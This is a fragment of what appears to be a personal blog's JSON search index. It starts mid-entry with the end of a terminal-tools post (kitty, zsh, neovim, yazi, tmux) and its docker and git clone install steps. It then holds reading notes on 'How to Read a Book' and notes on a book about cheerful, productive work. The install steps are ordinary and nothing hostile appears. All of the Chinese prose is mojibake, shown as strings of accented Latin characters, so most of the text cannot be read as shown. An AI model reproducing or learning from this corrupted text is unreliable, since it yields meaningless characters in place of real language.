href=\"https://github.com/kovidgoyal/kitty\"\u003ekitty\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eshell: \u003ca href=\"https://www.zsh.org/\"\u003ezsh\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eeditor: \u003ca href=\"https://github.com/neovim/neovim\"\u003eneovim\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eterminal filemanager: \u003ca href=\"https://github.com/sxyazi/yazi\"\u003eyazi\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003emultiplexers: \u003ca href=\"https://github.com/tmux/tmux\"\u003etmux\u003c/a\u003e or \u003ca href=\"https://github.com/kovidgoyal/kitty\"\u003ekitty\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"try\"\u003eTry\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run -it --rm --name dev ch4xer/dev:latest /bin/zsh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"install\"\u003eInstall\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone https://github.com/ch3n9w/dev\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd dev\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# install dependency software and install configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./scripts/install-software.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAlternatively (if you dont want to install all of them), you can copy the configuration directory you like to \u003ccode\u003eXDG_CONFIG_HOME\u003c/code\u003e (commonly \u003ccode\u003e~/.config\u003c/code\u003e), for example:\u003c/p\u003e","title":"ç»ˆç«¯å·¥å…·é›†(2024)"},{"content":"è¿™æœ¬ä¹¦ä¸»è¦ä»‹ç»äº†åœ¨è¿›è¡Œä»¥æå‡ç†è§£åŠ›ä¸ºç›®çš„çš„é˜…è¯»æ—¶æ‰€åº”è¯¥æŒæ¡çš„æŠ€å·§, è¿™äº›æŠ€å·§å¯ä»¥å¸®åŠ©æå‡é˜…è¯»çš„æ•ˆç‡, èŠ‚çº¦æ—¶é—´çš„åŒæ—¶æŠ“ä½é‡ç‚¹. æ³¨æ„, è¿™äº›æŠ€å·§å¹¶ä¸ä¼šè®©é˜…è¯»å˜å¾—æ›´è½»æ¾, ç›¸å, è¯»è€…æ¶ˆè€—çš„ç²¾åŠ›å¯èƒ½ä¼šæ›´å¤š, å› ä¸ºè¿™äº›æŠ€å·§è¦æ±‚è¯»è€…æ›´å¤šåœ°å‘æŒ¥å…¶ä¸»åŠ¨æ€§, ç„¶è€Œ, è¿™äº›æŠ€å·§èƒ½å¤Ÿå¸®åŠ©è¯»è€…æ›´å¥½åœ°æå‡è‡ªå·±çš„ç†è§£åŠ›å’ŒçŸ¥è¯†å¸æ”¶çš„é€Ÿåº¦, å¹¶ä¸”æœ‰é’ˆå¯¹æ€§åœ°è¿ç”¨æœ‰é™çš„ç²¾åŠ›.\næœ¬ä¹¦å¹¶ä¸è°ˆè®ºä»¥æ¶ˆé£ä¸ºç›®çš„çš„é˜…è¯»æ´»åŠ¨, ä¹Ÿä¸ä¼šè°ˆè®ºå•çº¯ä»¥è·å–èµ„è®¯ä¸ºç›®çš„çš„é˜…è¯»æ´»åŠ¨, å°½ç®¡åœ¨æå‡ç†è§£åŠ›å, è·å–èµ„è®¯ä¼šæ›´åŠ è¿…é€Ÿ.\nå››ä¸ªå±‚æ¬¡çš„é˜…è¯» é˜…è¯»çš„å››ä¸ªå±‚æ¬¡, è¿™å‡ ä¸ªå±‚æ¬¡æ˜¯ç›¸äº’åŒ…å«, å±‚å±‚é€’è¿›çš„:\nåŸºç¡€é˜…è¯»: ç†Ÿæ‚‰ç†è§£å¹¶æŒæ¡è¯è¯­å’Œå¥å­çš„æ„æ€ æ£€è§†é˜…è¯»: åœ¨è§„å®šæ—¶é—´å†…ä»å®è§‚å±‚é¢ä¸Šç†è§£ä¹¦ä¸­çš„é‡ç‚¹, ä»è€Œåˆ¤æ–­å€¼ä¸å€¼å¾—è¯» ç³»ç»Ÿæ€§ç•¥è¯» é˜…è¯»ä¹¦å åºè¨€ ç›®å½• ä»ç›®å½•ä¸­æŒ‘å‡ ä¸ªä¸ä¸»é¢˜ç›¸å…³çš„ç¯‡ç« , ä»”ç»†é˜…è¯»å¼€å¤´å’Œç»“å°¾å¤„çš„æ‘˜è¦è¯´æ˜ éšä¾¿ç¿»ç¿»å…¨ä¹¦, éšæ—¶å¯»æ‰¾ä¸»è¦è®ºç‚¹, ä¸è¦å¿½ç•¥æœ€åçš„ä¸¤ä¸‰é¡µ ç²—æµ…é˜…è¯» ä»å¤´åˆ°å°¾å…ˆè¯»å®Œä¸€é, ç¢°åˆ°ä¸æ‡‚çš„åœ°æ–¹ä¸è¦åœä¸‹æ¥æŸ¥è¯¢æˆ–æ€è€ƒ, åªæ³¨æ„ä½ èƒ½ç†è§£çš„åœ°æ–¹, ä¸è¦ä¸ºäº†ä¸€äº›æ²¡èƒ½ç«‹åˆ»ç†è§£çš„åœ°æ–¹è€Œåœé¡¿, è¿™æ ·å°±ä¸ä¼šæ‹˜æ³¥äºå±€éƒ¨ å…‹æœåœ¨ğŸ§ å¤§è„‘ä¸­å¿µå‡ºå£°çš„é˜…è¯»æ–¹å¼, å¤´è„‘å’Œçœ¼ç›ä¸ä¸€æ ·, å¹¶ä¸éœ€è¦ä¸€æ¬¡åª\u0026quot;è¯»\u0026quot;ä¸€ä¸ªå­—æˆ–è€…å¥å­ =\u0026gt; åˆ©ç”¨æ‰‹æŒ‡åœ¨ä¹¦é¡µä¸Šçš„ç§»åŠ¨æ¥å¼•å¯¼çœ¼ç›å’Œå¤§è„‘ åˆ†æé˜…è¯»: å…¨ç›˜å®Œæ•´çš„é˜…è¯» (ä¸å®Œå…¨é€‚ç”¨äºå°è¯´å’Œè¯—é›†) é˜¶æ®µä¸€ ä¸ºä¹¦ç±åˆ†ç±»(å°è¯´?çˆ±æƒ…å°è¯´?è®ºè¯´ç±»?ç»æµå­¦?å†å²?å“²å­¦?) =\u0026gt; ä»€ä¹ˆç±»å‹çš„æˆ¿å­ ç”¨å‡ å¥è¯å™è¿°æ•´æœ¬ä¹¦çš„å†…å®¹ =\u0026gt; æˆ¿å­çš„æ•´ä½“åŠŸèƒ½(æ•´ä½“æ€§) å°†é‡è¦ç¯‡ç« åˆ—ä¸¾å‡ºæ¥, è¯´æ˜å®ƒä»¬å¦‚ä½•å½¢æˆäº†æ•´ä½“ =\u0026gt; ç –ç“¦çš„åŠŸèƒ½å’Œè”ç³»(å¤æ‚æ€§) é˜¶æ®µäºŒ æ‰¾å‡ºå…³é”®å­—, ç¡®è®¤æ¯ä¸ªå­—ä¸åŒæ„ä¹‰ä¹‹é—´çš„è½¬æ¢, ä¸ä½œè€…æ‰¾å‡ºå…±é€šçš„è¯­ä¹‰ é‡æ–°æ¶æ„ä½œè€…è®ºè¿°çš„å‰å› åæœ ç¡®å®šä½œè€…è§£å†³äº†ä»€ä¹ˆé—®é¢˜, è¿˜æœ‰å“ªäº›é—®é¢˜æ²¡æœ‰è§£å†³ é˜¶æ®µä¸‰: å¯¹ä¹¦æœ¬ä¸‹è¯„è®º ä¸»é¢˜é˜…è¯»: é¢å¯¹ä¸€æœ¬ä¹¦æ—¶å»é˜…è¯»è®¸å¤šåŒç±»å‹çš„å…¶ä»–ä¹¦ç±, å¹¶ç›¸äº’å¯¹æ¯” é’ˆå¯¹ä¸»é¢˜è®¾è®¡å®éªŒæ€§ä¹¦ç›®, æ‰¾å‡ºå¹¶ç¡®å®šç›¸å…³çš„ä¹¦ç± é˜…è¯»è¿™äº›ä¹¦ç±çš„ç›¸å…³ç« èŠ‚ å»ºç«‹ä¸­ç«‹çš„ä¸»æ—¨å’Œè¯æ±‡, åˆ—å‡ºä¸€è¿ä¸²ç›¸å…³çš„é—®é¢˜ ç•Œå®šæ¯ä¸ªä½œè€…ç ”ç©¶çš„ä¸»è¦å’Œæ¬¡è¦è®®é¢˜ åˆ†æè¿™äº›è®¨è®ºã€‚è¿™å¾—æŠŠé—®é¢˜å’Œè®®é¢˜æŒ‰é¡ºåºæ’åˆ—ï¼Œä»¥æ±‚çªæ˜¾ä¸»é¢˜ æ‰€è°“é˜…è¯»é€Ÿåº¦, ä¸åªæ˜¯è¦èƒ½è¯»å¾—å¿«, è¿˜è¦èƒ½ç”¨ä¸åŒçš„é€Ÿåº¦æ¥é˜…è¯», è¦çŸ¥é“ä»€ä¹ˆæ—¶å€™ç”¨ä»€ä¹ˆé€Ÿåº¦æ˜¯æ°å½“çš„.\nè¯»è€…çš„è‡ªæˆ‘è¦æ±‚ è®¸å¤šäººå°½ç®¡å¯ä»¥åŒºåˆ†å‡ºé˜…è¯»çš„è·ç›Šä¸å–ä¹ä¹‹ä¸åŒâ€”â€”å…¶ä¸­ä¸€æ–¹æ˜¯ç†è§£åŠ›çš„å¢è¿›ï¼Œå¦ä¸€æ–¹åˆ™æ˜¯å¨±ä¹æˆ–åªæ˜¯æ»¡è¶³ä¸€ç‚¹ç‚¹çš„å¥½å¥‡å¿ƒâ€”â€”æœ€åä»ç„¶æ— æ³•å®Œæˆä»–ä»¬çš„é˜…è¯»ç›®æ ‡ã€‚å°±ç®—ä»–ä»¬çŸ¥é“é‚£æœ¬ä¹¦è¯¥ç”¨ä»€ä¹ˆæ ·çš„æ–¹å¼æ¥é˜…è¯»ï¼Œè¿˜æ˜¯å¤±è´¥ã€‚åŸå› å°±åœ¨ä»–ä»¬ä¸çŸ¥é“å¦‚ä½•åšä¸ªè‡ªæˆ‘è¦æ±‚çš„é˜…è¯»è€…ï¼Œå¦‚ä½•å°†ç²¾ç¥é›†ä¸­åœ¨ä»–ä»¬æ‰€åšçš„äº‹æƒ…ä¸Šï¼Œè€Œä¸ä¼šä¸€æ— æ‰€è·ã€‚\nè¯»è€…è¦æå‡ºå¹¶å›ç­”å››ä¸ªåŸºæœ¬é—®é¢˜ æ•´ä½“æ¥è¯´ï¼Œè¿™æœ¬ä¹¦åˆ°åº•åœ¨è°ˆäº›ä»€ä¹ˆï¼Ÿ =\u0026gt; ä¸»é¢˜ ä½œè€…éƒ½è¯´äº†ä»€ä¹ˆï¼Œæ€ä¹ˆè¯´çš„ï¼Ÿ =\u0026gt; è®ºç‚¹ è¿™æœ¬ä¹¦è¯´å¾—æœ‰é“ç†å—ï¼Ÿæ˜¯å…¨éƒ¨æœ‰é“ç†ï¼Œè¿˜æ˜¯éƒ¨åˆ†æœ‰é“ç†ï¼Ÿ =\u0026gt; æ€è€ƒä¸åˆ¤æ–­ è¿™æœ¬ä¹¦è·Ÿä½ æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ =\u0026gt; çŸ¥è¡Œåˆä¸€ åšç¬”è®°, ç”¨è‡ªå·±çš„è¯­è¨€è¡¨è¾¾æ—¶ä¼šå¼ºè¿«è¿›è¡Œæ€è€ƒ æ ¹æ®å…¨ä¹¦ç»“æ„åšç¬”è®° åŠ å…¥ä½œè€…çš„è§‚ç‚¹å’Œè‡ªå·±çš„è§‚ç‚¹ é’ˆå¯¹æƒ…æ™¯è¿›è¡Œè®¨è®ºçš„ç¬”è®°, åŒæ—¶å‡ºç°å¤šæœ¬ä¹¦çš„å†…å®¹ ","permalink":"https://dragonbox.top/posts/read-how-to-read-a-book/","summary":"\u003cp\u003eè¿™æœ¬ä¹¦ä¸»è¦ä»‹ç»äº†åœ¨è¿›è¡Œä»¥æå‡ç†è§£åŠ›ä¸ºç›®çš„çš„é˜…è¯»æ—¶æ‰€åº”è¯¥æŒæ¡çš„æŠ€å·§, è¿™äº›æŠ€å·§å¯ä»¥å¸®åŠ©æå‡é˜…è¯»çš„æ•ˆç‡, èŠ‚çº¦æ—¶é—´çš„åŒæ—¶æŠ“ä½é‡ç‚¹. æ³¨æ„, è¿™äº›æŠ€å·§å¹¶ä¸ä¼šè®©é˜…è¯»å˜å¾—æ›´è½»æ¾, ç›¸å, è¯»è€…æ¶ˆè€—çš„ç²¾åŠ›å¯èƒ½ä¼šæ›´å¤š, å› ä¸ºè¿™äº›æŠ€å·§è¦æ±‚è¯»è€…æ›´å¤šåœ°å‘æŒ¥å…¶ä¸»åŠ¨æ€§, ç„¶è€Œ, è¿™äº›æŠ€å·§èƒ½å¤Ÿå¸®åŠ©è¯»è€…æ›´å¥½åœ°æå‡è‡ªå·±çš„ç†è§£åŠ›å’ŒçŸ¥è¯†å¸æ”¶çš„é€Ÿåº¦, å¹¶ä¸”æœ‰é’ˆå¯¹æ€§åœ°è¿ç”¨æœ‰é™çš„ç²¾åŠ›.\u003c/p\u003e\n\u003cp\u003eæœ¬ä¹¦å¹¶ä¸è°ˆè®ºä»¥æ¶ˆé£ä¸ºç›®çš„çš„é˜…è¯»æ´»åŠ¨, ä¹Ÿä¸ä¼šè°ˆè®ºå•çº¯ä»¥è·å–èµ„è®¯ä¸ºç›®çš„çš„é˜…è¯»æ´»åŠ¨, å°½ç®¡åœ¨æå‡ç†è§£åŠ›å, è·å–èµ„è®¯ä¼šæ›´åŠ è¿…é€Ÿ.\u003c/p\u003e\n\u003ch2 id=\"å››ä¸ªå±‚æ¬¡çš„é˜…è¯»\"\u003eå››ä¸ªå±‚æ¬¡çš„é˜…è¯»\u003c/h2\u003e\n\u003cp\u003eé˜…è¯»çš„å››ä¸ªå±‚æ¬¡, è¿™å‡ ä¸ªå±‚æ¬¡æ˜¯ç›¸äº’åŒ…å«, å±‚å±‚é€’è¿›çš„:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eåŸºç¡€é˜…è¯»\u003c/strong\u003e: ç†Ÿæ‚‰ç†è§£å¹¶æŒæ¡è¯è¯­å’Œå¥å­çš„æ„æ€\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eæ£€è§†é˜…è¯»\u003c/strong\u003e: åœ¨è§„å®šæ—¶é—´å†…ä»å®è§‚å±‚é¢ä¸Šç†è§£ä¹¦ä¸­çš„é‡ç‚¹, ä»è€Œåˆ¤æ–­å€¼ä¸å€¼å¾—è¯»\n\u003col\u003e\n\u003cli\u003eç³»ç»Ÿæ€§ç•¥è¯»\n\u003col\u003e\n\u003cli\u003eé˜…è¯»ä¹¦å åºè¨€ ç›®å½•\u003c/li\u003e\n\u003cli\u003eä»ç›®å½•ä¸­æŒ‘å‡ ä¸ªä¸ä¸»é¢˜ç›¸å…³çš„ç¯‡ç« , ä»”ç»†é˜…è¯»å¼€å¤´å’Œç»“å°¾å¤„çš„æ‘˜è¦è¯´æ˜\u003c/li\u003e\n\u003cli\u003eéšä¾¿ç¿»ç¿»å…¨ä¹¦, éšæ—¶å¯»æ‰¾ä¸»è¦è®ºç‚¹, ä¸è¦å¿½ç•¥æœ€åçš„ä¸¤ä¸‰é¡µ\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eç²—æµ…é˜…è¯»\n\u003col\u003e\n\u003cli\u003eä»å¤´åˆ°å°¾å…ˆè¯»å®Œä¸€é, ç¢°åˆ°ä¸æ‡‚çš„åœ°æ–¹ä¸è¦åœä¸‹æ¥æŸ¥è¯¢æˆ–æ€è€ƒ, åªæ³¨æ„ä½ èƒ½ç†è§£çš„åœ°æ–¹, ä¸è¦ä¸ºäº†ä¸€äº›æ²¡èƒ½ç«‹åˆ»ç†è§£çš„åœ°æ–¹è€Œåœé¡¿, è¿™æ ·å°±ä¸ä¼šæ‹˜æ³¥äºå±€éƒ¨\u003c/li\u003e\n\u003cli\u003eå…‹æœåœ¨ğŸ§ å¤§è„‘ä¸­å¿µå‡ºå£°çš„é˜…è¯»æ–¹å¼, å¤´è„‘å’Œçœ¼ç›ä¸ä¸€æ ·, å¹¶ä¸éœ€è¦ä¸€æ¬¡åª\u0026quot;è¯»\u0026quot;ä¸€ä¸ªå­—æˆ–è€…å¥å­ =\u0026gt; åˆ©ç”¨æ‰‹æŒ‡åœ¨ä¹¦é¡µä¸Šçš„ç§»åŠ¨æ¥å¼•å¯¼çœ¼ç›å’Œå¤§è„‘\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eåˆ†æé˜…è¯»\u003c/strong\u003e: å…¨ç›˜å®Œæ•´çš„é˜…è¯» (ä¸å®Œå…¨é€‚ç”¨äºå°è¯´å’Œè¯—é›†)\n\u003col\u003e\n\u003cli\u003eé˜¶æ®µä¸€\n\u003col\u003e\n\u003cli\u003eä¸ºä¹¦ç±åˆ†ç±»(å°è¯´?çˆ±æƒ…å°è¯´?è®ºè¯´ç±»?ç»æµå­¦?å†å²?å“²å­¦?) =\u0026gt; ä»€ä¹ˆç±»å‹çš„æˆ¿å­\u003c/li\u003e\n\u003cli\u003eç”¨å‡ å¥è¯å™è¿°æ•´æœ¬ä¹¦çš„å†…å®¹ =\u0026gt; æˆ¿å­çš„æ•´ä½“åŠŸèƒ½(æ•´ä½“æ€§)\u003c/li\u003e\n\u003cli\u003eå°†é‡è¦ç¯‡ç« åˆ—ä¸¾å‡ºæ¥, è¯´æ˜å®ƒä»¬å¦‚ä½•å½¢æˆäº†æ•´ä½“ =\u0026gt; ç –ç“¦çš„åŠŸèƒ½å’Œè”ç³»(å¤æ‚æ€§)\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eé˜¶æ®µäºŒ\n\u003col\u003e\n\u003cli\u003eæ‰¾å‡ºå…³é”®å­—, ç¡®è®¤æ¯ä¸ªå­—ä¸åŒæ„ä¹‰ä¹‹é—´çš„è½¬æ¢, ä¸ä½œè€…æ‰¾å‡ºå…±é€šçš„è¯­ä¹‰\u003c/li\u003e\n\u003cli\u003eé‡æ–°æ¶æ„ä½œè€…è®ºè¿°çš„å‰å› åæœ\u003c/li\u003e\n\u003cli\u003eç¡®å®šä½œè€…è§£å†³äº†ä»€ä¹ˆé—®é¢˜, è¿˜æœ‰å“ªäº›é—®é¢˜æ²¡æœ‰è§£å†³\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eé˜¶æ®µä¸‰: å¯¹ä¹¦æœ¬ä¸‹è¯„è®º\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eä¸»é¢˜é˜…è¯»\u003c/strong\u003e: é¢å¯¹ä¸€æœ¬ä¹¦æ—¶å»é˜…è¯»è®¸å¤šåŒç±»å‹çš„å…¶ä»–ä¹¦ç±, å¹¶ç›¸äº’å¯¹æ¯”\n\u003col\u003e\n\u003cli\u003eé’ˆå¯¹ä¸»é¢˜è®¾è®¡å®éªŒæ€§ä¹¦ç›®, æ‰¾å‡ºå¹¶ç¡®å®šç›¸å…³çš„ä¹¦ç±\u003c/li\u003e\n\u003cli\u003eé˜…è¯»è¿™äº›ä¹¦ç±çš„ç›¸å…³ç« èŠ‚\u003c/li\u003e\n\u003cli\u003eå»ºç«‹ä¸­ç«‹çš„ä¸»æ—¨å’Œè¯æ±‡, åˆ—å‡ºä¸€è¿ä¸²ç›¸å…³çš„é—®é¢˜\u003c/li\u003e\n\u003cli\u003eç•Œå®šæ¯ä¸ªä½œè€…ç ”ç©¶çš„ä¸»è¦å’Œæ¬¡è¦è®®é¢˜\u003c/li\u003e\n\u003cli\u003eåˆ†æè¿™äº›è®¨è®ºã€‚è¿™å¾—æŠŠé—®é¢˜å’Œè®®é¢˜æŒ‰é¡ºåºæ’åˆ—ï¼Œä»¥æ±‚çªæ˜¾ä¸»é¢˜\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæ‰€è°“é˜…è¯»é€Ÿåº¦, ä¸åªæ˜¯è¦èƒ½è¯»å¾—å¿«, è¿˜è¦èƒ½ç”¨ä¸åŒçš„é€Ÿåº¦æ¥é˜…è¯», è¦çŸ¥é“ä»€ä¹ˆæ—¶å€™ç”¨ä»€ä¹ˆé€Ÿåº¦æ˜¯æ°å½“çš„.\u003c/p\u003e","title":"ã€Šå¦‚ä½•é˜…è¯»ä¸€æœ¬ä¹¦ã€‹è¯»ä¹¦ç¬”è®°"},{"content":"è¿™æœ¬ä¹¦ä¸»è¦è®¨è®ºäº†å¦‚ä½•åœ¨å·¥ä½œè¿‡ç¨‹ä¸­ä¿æŒæ„‰æ‚¦çš„å¿ƒæ€, è¿›è€Œæå‡å·¥ä½œæ•ˆç‡, ä¿æŠ¤ç²¾ç¥å¥åº·. ä½œè€…è®¤ä¸ºæ„‰æ‚¦å¿ƒæ€å¯ä»¥å¸®åŠ©å…‹æœç„¦è™‘å’Œè¿‡åº¦çš„å‹åŠ›, æˆåŠŸä¸ä¼šè®©ä½ æ„Ÿè§‰æ„‰æ‚¦, ä½†æ˜¯æ„Ÿè§‰æ„‰æ‚¦ä¼šä¸ºä½ å¸¦æ¥æˆåŠŸ.\næœ¬ä¹¦å†…å®¹åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†: æ¿€åŠ±(è®©å·¥ä½œæ›´æœ‰å…´è‡´) è§£é”(æ¶ˆé™¤é¢å¯¹å·¥ä½œæ—¶çš„è´Ÿé¢æƒ…ç»ª) ç»­èˆª(é€šè¿‡è‰¯å¥½çš„ä¹ æƒ¯å…‹æœå€¦æ€ æ„Ÿ)\næ¿€åŠ± æ¸¸æˆåŒ–æ€ç»´ æœ‰è¶£çš„æ¸¸æˆåŒ–ä½“éªŒä¼šå¸¦æ¥æ„‰æ‚¦\né€‰æ‹©ä¸€ä¸ªæ¸¸æˆæ€§æ ¼, æ‰¾å‡ºæœ€èƒ½ä¸ä½ äº§ç”Ÿå…±é¸£çš„æ¸¸æˆçŠ¶æ€, å¹¶æœ‰æ„è¯†çš„æŠŠè‡ªå·±å½“ä½œè¿™ä¸ªè§’è‰²æ¥å¯¹å¾…å·¥ä½œ, ä»£å…¥ä¸€åœºå†’é™©\næ”¶è—å®¶ï¼šå–œæ¬¢æ”¶é›†å’Œæ•´ç†ç‰©å“ï¼Œå–œæ¬¢å¯»æ‰¾çç¨€æ¤ç‰©ã€æ‹å–æ¡£æ¡ˆé¦†æˆ–è½¦åº“ä¸­çš„çå®ç­‰æ´»åŠ¨ã€‚ ç«äº‰è€…ï¼šå–œæ¬¢æ¸¸æˆå’Œä½“è‚²èµ›äº‹ï¼Œä»¥å…¨åŠ›ä»¥èµ´å’Œè·èƒœä¸ºä¹ã€‚ æ¢ç´¢è€…ï¼šå–œæ¬¢å¾’æ­¥æ—…è¡Œã€å…¬è·¯æ—…è¡Œå’Œå…¶ä»–æ¢ç´¢æ´»åŠ¨ï¼Œå–œæ¬¢è¡Œèµ°å’Œå‘ç°æ–°çš„åœ°æ–¹å’Œä»æœªè§è¿‡çš„äº‹ç‰©ã€‚ åˆ›é€ è€…ï¼šåœ¨åˆ›é€ ä¸­æ‰¾åˆ°å¿«ä¹ï¼Œæ¯å¤©å¯ä»¥èŠ±å‡ ä¸ªå°æ—¶æ¶‚é¸­ã€ç»˜ç”»ã€åˆ¶ä½œéŸ³ä¹ã€å›­è‰ºç­‰ã€‚ è®²æ•…äº‹çš„äººï¼šæƒ³è±¡åŠ›ä¸°å¯Œï¼Œèƒ½ç”¨è‡ªå·±çš„æƒ³è±¡åŠ›å–æ‚¦ä»–äººã€‚ä»–ä»¬å–œæ¬¢å†™ä½œã€èˆè¹ˆã€æˆå‰§å’Œè§’è‰²æ‰®æ¼”ã€‚ å°ä¸‘ï¼šåŠªåŠ›é€—äººå‘ç¬‘ï¼Œå¯èƒ½ä¼šé€šè¿‡å€’ç«‹ã€å³å…´è¡¨æ¼”æˆ–æ¶ä½œå‰§é€—ä½ å‘ç¬‘ã€‚ å¯¼æ¼”ï¼šå–œæ¬¢ç­–åˆ’ã€ç»„ç»‡å’Œé¢†å¯¼ä»–äººï¼Œèƒ½èƒœä»»å„ç§è§’è‰²å’Œæ´»åŠ¨ï¼Œä»å¯¼æ¼”èˆå°å‰§åˆ°ç®¡ç†å…¬å¸ï¼Œå†åˆ°å‚ä¸æ”¿æ²»æˆ–ç¤¾ä¼šè¿åŠ¨ã€‚ åŠ¨è§‰å‹ï¼š åœ¨æ‚æŠ€ã€ä½“æ“å’Œè‡ªç”±è·‘ç­‰ä½“è‚²æ´»åŠ¨ä¸­æ‰¾åˆ°ä¹è¶£ã€‚ å–„äºè¿ç”¨å¥½å¥‡çš„åŠ›é‡, å½“è¢«é—®åˆ°è®©äººå¥½å¥‡çš„é—®é¢˜çš„æ—¶å€™, å¤§è„‘ä¼šå¼€å§‹åˆ†æ³Œå¤šå·´èƒº, æ›´è®©äººä¸“æ³¨\nå·¥ä½œæ—¶å€™å¤šé—®é—®è‡ªå·±é—®é¢˜ æ¯å¤©é™¤äº†æ—¥å¸¸ä»»åŠ¡ä¹‹å¤–ç»™è‡ªå·±å¢åŠ ä¸€ä¸ªè®©äººå¥½å¥‡çš„æ”¯çº¿ä»»åŠ¡: æ¢ç´¢æ–°çš„è½¯ä»¶ å­¦ä¹ æ–°çš„ç¼–ç¨‹è¯­è¨€ å­¦ä¹ æ–°çš„æ¨¡å‹, ç»™ç©å¿ƒåˆ›é€ ç©ºé—´ å¤šé—®é—®è‡ªå·±, æ€ä¹ˆæ ·èƒ½è®©è¿™ä¸ªä»»åŠ¡å˜å¾—æ›´åŠ æœ‰è¶£? è¦æ›´åŠ ä¸“æ³¨äºä»»åŠ¡è¿‡ç¨‹å¸¦æ¥çš„ä¹è¶£, è€Œä¸æ˜¯ç»“æœ.\nå‹åŠ›ä¼šé™ä½æ¸¸æˆçš„èƒ½åŠ›, ä¹Ÿä¼šé™ä½ç”Ÿäº§åŠ›, è¿™æ„å‘³ç€ä¸ºäº†æ¿€å‘ç©å¿ƒ, æˆ‘ä»¬ä¸åªéœ€è¦è¿½æ±‚å†’é™©å’Œå¯»æ‰¾ä¹è¶£, è¿˜éœ€è¦åŠªåŠ›åˆ›é€ ä¸€ä¸ªä½é£é™©èƒ½è®©äººæ”¾æ¾çš„ç¯å¢ƒ\nå­¦ä¹ é»‘æš—ä¹‹é­‚çš„æ€è·¯å»çœ‹å¾…å¤±è´¥, å°†å¤±è´¥çœ‹ä½œæ˜¯å†’é™©ä¸­ä¸å¯åˆ†å‰²çš„ä¸€éƒ¨åˆ†, æ˜¯å°è¯•æ–°äº‹ç‰©çš„å®éªŒ, æ˜¯æˆåŠŸè·¯ä¸Šçš„å¿…ç»ä¹‹è·¯, æ˜¯éšå½¢çš„è¿›æ­¥\nå¤šæé†’æé†’è‡ªå·±, ä¸è¦è¿‡äºä¸¥è‚ƒ, è€Œæ˜¯çœŸè¯šä»¥å¯¹\nå¥½æ¯”ç©ä¸€åœºå¤§å¯Œç¿æ¸¸æˆ, æ— æ‰€è°“çš„å¿ƒæ€è‡ªç„¶æ— æ³•ç©å¥½, è¿‡äºä¸¥è‚ƒå¯¹å¾—å¤±æ–¤æ–¤è®¡è¾ƒåˆ™æ— è®ºè¿‡ç¨‹æ˜¯å¦é¡ºåˆ©éƒ½ä½“ä¼šä¸åˆ°ä¹è¶£, åªæœ‰çœŸè¯šå¯¹å¾…æ¸¸æˆ, å…¨å¿ƒæŠ•å…¥æ¯ä¸€ä¸ªè¿‡ç¨‹å´åˆä¸è®¡è¾ƒå¾—å¤±, æ‰èƒ½å¼€æ€€å¤§ç¬‘. (å¾ˆé‡è¦)\nè‡ªæˆ‘èµ‹æƒ è‡ªä¿¡å¿ƒä¼šç»™å·¥ä½œè¿‡ç¨‹å¸¦æ¥å¿«ä¹, è®©äººè¡¨ç°æ›´å¥½\nå¯¹äºäººç±»çš„è¡¨ç°å’Œç¦ç¥‰è€Œè¨€, é‡è¦çš„ä¸åªæ˜¯æˆ‘ä»¬çš„èƒ½åŠ›, è€Œä½¿æˆ‘ä»¬å¯¹è‡ªèº«èƒ½åŠ›çš„æ„Ÿå—\nè‡ªä¿¡å¹¶éä¸ç”Ÿä¿±æ¥, è€Œä½¿é€è¿‡å­¦ä¹ è·å¾—\nä½ è¯´çš„è¯å¾€å¾€ä¼šæˆä¸ºä½ ç›¸ä¿¡çš„çœŸç†, å½“ä½ å¬åˆ°\u0026quot;ä½ èƒ½åŠåˆ°\u0026quot;, \u0026ldquo;å°±å¿«æˆåŠŸäº†\u0026quot;ç­‰å¾®å°é¼“åŠ±, å°±è¶³ä»¥å¯¹è‡ªä¿¡æ°´å¹³å‘ç”Ÿå½±å“, æ›´é‡è¦çš„æ˜¯, è‡ªå·±å¯ä»¥å‘è‡ªå·±ä¼ è¾¾æ­£é¢è®¯æ¯.\nå¤šé—®é—®è‡ªå·±: å¦‚æœå¾ˆæœ‰ä¿¡å¿ƒåšå¥½è¿™ä»¶äº‹, ä¼šæ˜¯ä»€ä¹ˆæ ·å­?\næ‰¾åˆ°å’Œä½ ç»å†åŒæ 